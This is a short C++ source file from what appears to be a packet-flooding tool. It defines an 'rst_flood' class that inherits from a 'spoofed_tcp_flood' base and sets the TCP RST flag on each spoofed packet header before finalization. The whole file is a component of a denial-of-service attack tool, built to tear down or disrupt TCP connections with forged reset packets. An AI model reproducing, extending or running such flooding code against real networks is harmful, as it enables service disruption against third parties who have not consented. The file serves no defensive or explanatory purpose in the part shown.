#include "rst_flood.h"

rst_flood::rst_flood(std::shared_ptr<Config> config)
    : spoofed_tcp_flood(std::move(config)) {}

void rst_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
  tcp->th_flags = TH_RST;
  spoofed_tcp_flood::finalize_hdr(tcp, ip);
}